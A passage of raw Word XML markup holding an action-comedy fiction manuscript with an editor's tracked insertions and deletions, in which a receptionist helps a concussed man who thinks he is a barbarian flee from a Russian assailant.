            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">stood </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lean</w:t>
      </w:r>
      <w:ins w:id="1421" w:author="TextVet" w:date="2016-03-18T15:15:00Z">
        <w:r w:rsidR="00895B7B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1422" w:author="TextVet" w:date="2016-03-18T15:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00895B7B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> against the wall, s</w:t>
      </w:r>
      <w:ins w:id="1423" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidR="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>u</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1424" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ta</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:ins w:id="1425" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidR="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>vey</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ing</w:t>
      </w:r>
      <w:del w:id="1426" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> down</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> emptily as bodily fluids trickled </w:t>
      </w:r>
      <w:ins w:id="1427" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidR="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>from</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1428" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>out of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face </w:t>
      </w:r>
      <w:del w:id="1429" w:author="TextVet" w:date="2016-03-18T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004768B1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to the carpet.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w:t>
      </w:r>
      <w:ins w:id="1430" w:author="TextVet" w:date="2016-03-18T15:17:00Z">
        <w:r w:rsidR="00823A56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>touched</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1431" w:author="TextVet" w:date="2016-03-18T15:17:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00823A56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>laid her hand on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his shoulder. “Hello. What’s your name?”</w:t>
      </w:r>
      <w:del w:id="1432" w:author="TextVet" w:date="2016-03-18T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0015479A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> she asked in a clear, clinical tone.</w:delText>
        </w:r>
      </w:del>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Mike turned his broken face toward her</w:t>
      </w:r>
      <w:ins w:id="1433" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidR="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1434" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="1435" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with a s</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1436" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidR="00EF1133">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lurr</w:t>
      </w:r>
      <w:ins w:id="1437" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidR="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1438" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed voice</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1439" w:author="TextVet" w:date="2016-03-18T15:19:00Z">
        <w:r w:rsidR="00EF1133">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ng</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he answered</w:t>
      </w:r>
      <w:ins w:id="1440" w:author="TextVet" w:date="2016-03-18T15:18:00Z">
        <w:r w:rsidR="0015479A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> her clear, clinical tone</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1441" w:author="TextVet" w:date="2016-03-18T15:20:00Z">
        <w:r w:rsidR="00E7243D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1442" w:author="TextVet" w:date="2016-03-18T15:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E7243D">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“I am called Krongor, Barbarian of the Lowland Plains.”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turned on the cellphone and shined its light into Mike’s eyes.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 need to get him to a hospital right now,”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“Broken nose?”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“Concussion.”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off to the side, Mike droned, “Are you a priestess of Eir? I need healing.”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“Come on, big guy,” she said, slipping herself between him and the wall. “I’ll help you walk. Let’s get… </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Ghuh</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>! Holy </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>shit</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> you’re heavy!”</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escape back to the lobby</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> felt like a jerking montage, a miasmic swirl of wheezing and vomit and blood. The large concussed man </w:t>
      </w:r>
      <w:del w:id="1443" w:author="TextVet" w:date="2016-03-18T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00891256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">took long, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lumber</w:t>
      </w:r>
      <w:ins w:id="1444" w:author="TextVet" w:date="2016-03-18T15:22:00Z">
        <w:r w:rsidR="00891256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed with long</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1445" w:author="TextVet" w:date="2016-03-18T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00891256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ing</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> steps, too slow and sometimes in the wrong direction, </w:t>
      </w:r>
      <w:del w:id="1446" w:author="TextVet" w:date="2016-03-18T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00891256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">and </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>often stopping to yawn and trying to sit down in place.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geek, despite being wounded himself, handled most of the task of shepherding his scruffy friend. He yelled into his cellphone, “Rendezvous at the front! Jason, extract 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divided her attention between them and the Russian, whom she watched with horror as he regained consciousness. With a fit of coughs</w:t>
      </w:r>
      <w:ins w:id="1447" w:author="TextVet" w:date="2016-03-18T15:23:00Z">
        <w:r w:rsidR="00964ABF">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he propped himself up on his elbows. As she and the two men hurried down the hallway, the Russian turned to them with primal fury in his watery eyes. Tina flinchingly waved the small silver revolver. The sight of his own gun pointed at him only enraged him further.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still wasn’t quite able to breathe. He tripped, fell to his hands and knees and rasped loudly.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They rounded a bend in the hallway and tried to rush down the corridor towards the brightly lit lobby. But with the injured man’s disoriented ambling, the straight hallway felt like a twisting labyrinth. The bright spot of light at the end seemed to draw nightmarishly farther with every step forward. And behind them, </w:t>
      </w:r>
      <w:del w:id="1448" w:author="TextVet" w:date="2016-03-18T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00874F48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>half</w:t>
      </w:r>
      <w:ins w:id="1449" w:author="TextVet" w:date="2016-03-18T15:29:00Z">
        <w:r w:rsidR="00874F48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1450" w:author="TextVet" w:date="2016-03-18T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00874F48">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crawling</w:t>
      </w:r>
      <w:del w:id="1451" w:author="TextVet" w:date="2016-03-18T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00874F48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> gait</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="1452" w:author="TextVet" w:date="2016-03-18T15:29:00Z">
        <w:r w:rsidR="00874F48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">his </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1453" w:author="TextVet" w:date="2016-03-18T15:26:00Z">
        <w:r w:rsidR="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">eyes searing rabidly, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the Russian</w:t>
      </w:r>
      <w:del w:id="1454" w:author="TextVet" w:date="2016-03-18T15:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B46997">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, rasping and coughing,</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dragged himself around the corner</w:t>
      </w:r>
      <w:ins w:id="1455" w:author="TextVet" w:date="2016-03-18T15:28:00Z">
        <w:r w:rsidR="00B46997">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, wheezing</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:del w:id="1456" w:author="TextVet" w:date="2016-03-18T15:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> His eyes </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1457" w:author="TextVet" w:date="2016-03-18T15:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>burned</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1458" w:author="TextVet" w:date="2016-03-18T15:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1459" w:author="TextVet" w:date="2016-03-18T15:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a lust for </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1460" w:author="TextVet" w:date="2016-03-18T15:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00964ABF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>revenge.</w:delText>
        </w:r>
      </w:del>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They crashed into the lobby with the Russian gaining rapidly, his breath and strength quickly returning. The geek</w:t>
      </w:r>
      <w:del w:id="1461" w:author="TextVet" w:date="2016-03-18T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002A45A2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> wordlessly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> dropped his contraption to the floor and started pulling on Tina’s reception desk a few short feet from the lobby’s interior door. Tina understood, and rushed to the other side to lift and push. Everything on the desk — her computer, her purse, her paperwork — tumbled. They wedged it sideways against the wide glass door just as the Russian’s </w:t>
      </w:r>
      <w:ins w:id="1462" w:author="TextVet" w:date="2016-03-18T15:32:00Z">
        <w:r w:rsidR="001813BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>barreling</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1463" w:author="TextVet" w:date="2016-03-18T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001813BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>fast-moving</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> form </w:t>
      </w:r>
      <w:ins w:id="1464" w:author="TextVet" w:date="2016-03-18T15:32:00Z">
        <w:r w:rsidR="001813BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>hit</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1465" w:author="TextVet" w:date="2016-03-18T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001813BE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>appeared on</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
